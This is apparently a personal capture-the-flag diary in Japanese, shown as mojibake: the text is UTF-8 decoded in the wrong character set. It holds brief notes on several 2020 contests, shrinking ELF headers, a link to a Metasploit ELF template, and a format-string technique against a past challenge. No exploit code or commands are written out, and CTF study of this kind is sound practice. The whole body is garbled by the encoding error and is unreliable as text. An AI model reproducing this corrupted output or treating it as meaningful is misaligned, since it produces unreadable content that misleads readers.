- elfãƒ˜ãƒƒãƒ€ã‚‚ã„ã‚ã„ã‚æ±ºã¾ã£ã¦ã‚‹ã‘ã©ä¸‹åŠåˆ†ã¯ä½•ãŒæ›¸ã„ã¦ã‚ã£ã¦ã‚‚å®Ÿã¯å‹•ä½œã™ã‚‹ã®ã§æ¶ˆã—ã¦ã„ã„
- ã“ã‚Œã‚’ãƒ“ãƒƒãƒˆå˜ä½ã§çªãè©°ã‚ã‚‹ã¨çŸ­ã„ã‚³ãƒ¼ãƒ‰ã¨ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãƒ˜ãƒƒãƒ€ãŒelfãƒ˜ãƒƒãƒ€ã«åã¾ã£ã¡ã‚ƒã†ã€‚

å¾Œã¯elfã®ãƒ†ãƒ³ãƒ—ãƒ¬ãŒã‚ã£ã¦ï¼ˆhttps://github.com/Capa-cc/metasploit-framework/blob/e36f5602cbeec9c91a74fcdc81c82c795f0e151e/data/templates/src/elf/dll/elf_dll_x64_template.s ï¼‰ã€ã“ã‚Œã‚’ã‚‚ã¨ã«ä½œã£ã¦ã¿ã‚Œã°è‰¯ã„ã¿ãŸã„ã€‚




### hackpackctf2020
- ã‚½ãƒ­å‚åŠ ã€‚pwnã®ãƒªãƒãƒ“ãƒªã«ãªã£ãŸã€‚ã‚ã¨ç°¡å˜ãã†ãªã‚„ã¤ã‚’ã„ãã¤ã‹åˆ†ã‹ã‚‰ãªã‹ã£ãŸã®ã§åç©«ãŒã‚ã£ãŸã€‚riscvå•ã¯ãŠã•ãˆã¦ãŠããŸã„ãªã€‚qemuã¯å‹•ãã‘ã©ã‚³ãƒ¼ãƒ‰ã®è¦‹æ–¹ã¨gdbãŒæƒãˆã‚‰ã‚Œã¾ã›ã‚“ã§ã—ãŸã€‚

### ijctf2020
- VMå•ã‚’è§£ã„ã¦ã„ãŸã¯ãšãŒfsbã‚’è¦‹ã¤ã‘ãŸã¨ãã®å¤±æœ›æ„Ÿãªã€‚
- HTBå½¢å¼ã®å•é¡Œãªã‚“ã ã‘ã©LiveCDã§ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã‚„ã¤ã§è§£ã„ã¡ã‚ƒã£ã¦ã€å¤šåˆ†ã‚„ã£ã¡ã‚ƒã„ã‘ãªã„ã‚ˆã†ã«ãªã£ã¦ã‚‹ã‚“ã ã‚ã†ãªã€‚ã“ã‚Œã¡ã‚ƒã‚“ã¨ã—ãŸç’°å¢ƒãªã—ã§ç«¶æŠ€ã«ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€ãƒ•ãƒ©ã‚°ã‚ˆã‚Šæœ€åˆã‹ã‚‰writeupã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã›ã¦äººåŠ›ã‚µãƒ–ãƒŸãƒƒãƒˆã—ã¦ã„ã£ãŸæ–¹ãŒã„ã„ã®ã§ã¯ã€‚
- vaultã¯è‰¯å•ã ã£ãŸã€‚ã¡ã‚ƒã‚“ã¨ãƒ’ãƒ³ãƒˆã‚’è¦‹ã‚‹ã¹ãã€‚ãŸã¾ãŸã¾ä¸€å›å½“ãŸã£ã¦ã€æ™‚é–“åˆ‡ã‚Œã«ãªã£ã¦åŒã˜ã‚³ãƒ¼ãƒ‰åˆºã•ã‚‰ãªãã¦ã³ã£ãã‚Šã—ã¦ã‚„ã‚ã¡ã‚ƒã£ãŸã‘ã©ã‚ã£ã¡ã‚ƒãã‚Œã„ãªå•é¡Œã ã€‚æ¡è¶…ãˆã¦å…¥åŠ›ã™ã‚Œã°ã„ã„ã ã‘ã€‚

### houseplanet2020
- zipã‚ã£ã¡ã‚ƒå±•é–‹ã™ã‚‹ã‚„ã¤ã¨javaã®ãƒªãƒãƒ¼ã‚¹å•è§£ã„ãŸã€‚è‹±ä¼šè©±ã—ãŸã€‚

### de1CTF2020
- pwn1, misc1ã ã‘
- mipsãƒã‚¤ãƒŠãƒªãŒãµã£ã¦ãã‚‹ã‚„ã¤ã¯ãƒ˜ãƒƒãƒ‰ãƒ¬ã‚¹ã®ghidraã§ãƒ‡ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦çœŸé¢ç›®ã«è§£ã„ã¦ã¿ãŸã‘ã©ã ã‚ã€‚è§£æã«ï¼“ï¼ç§’ä½ã‹ã‹ã£ã¦ã€ã‚·ã‚§ãƒ«èµ°ã‚‰ã™ã«ã¯æ™‚é–“ãŒ0.1ç§’åˆ‡ã‚‰ãªã„ã¨ã ã‚ãªã®ã§è§£æ³•ãŒåˆ†ã‹ã‚‰ã‚“
- revã®parserã‚‚ï¼‘ï¼æ™‚é–“ãã‚‰ã„ã‹ã‘ãŸã‘ã©ã€ï¼‹ã¨ï¼¿ã®å‡¦ç†ãŒãã‚Œãã‚Œé•·éãã‚‹ã®ã¨ã€çµå±€åˆã†ãƒãƒƒã‚·ãƒ¥ãŒåˆ†ã‹ã‚‰ã‚“ã¨ã„ã†ã¨ã“ã‚ã§è©°ã‚“ã ã€‚ã“ã‚Œã¯è¡Œã‘ãã†ã ã£ãŸã‘ã©ãªã‚ã€‚æ‚”ã—ã„



### å¸¸è¨­
- htbã®pwnã¯ä»Šå›ã‚‚ç„¡äº‹åŸ‹ã¾ã£ãŸã€‚jopå•åˆã‚ã¦è¦‹ã¾ã—ãŸã€‚
- éå»å•ä¸¦ã‚“ã§ã‚‹ã‚„ã¤ã€‚CISCN2018ã®echo_backã¨ã„ã†å•é¡Œã¯fsbã§stdinã®buf_baseã‚’å¤‰æ›´ã—ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ã«æ›¸ãè¾¼ã‚ã‚‹ã‚ˆã†ã«æŒã£ã¦ã„ãã€‚FILEæ§‹é€ ä½“å•ã¯ã‚ã¨20å€‹ãã‚‰ã„ã‚„ã£ã¨ããŸã„ã€‚
- xyzã®knumã¤ã„ã«å€’ã—ãŸã€‚one_gadgetãŒä½¿ãˆãªã„ç†ç”±ã¯æœ€å¾Œã¾ã§è¬ã€‚fishingã‚‚å€’ã—ãŸã‘ã©ãƒ•ãƒ©ã‚°è¦‹ãŸã‚‰æƒ³å®šè§£æ³•ã˜ã‚ƒãªã„ã£ã½ã„ã€‚ã“ã‚Œä»¥å¤–ã‚„ã‚Šæ–¹åˆ†ã‹ã‚‰ã‚“ãŒã£ã¦ã„ã†æ„Ÿæƒ³ã€‚
- (5/1) xyzå…¨éƒ¨è§£ã‘ã¾ã—ãŸã€‚vmå•2å•ç›®ãŒã‚ã£ã¡ã‚ƒé›£ã—ã„ã€‚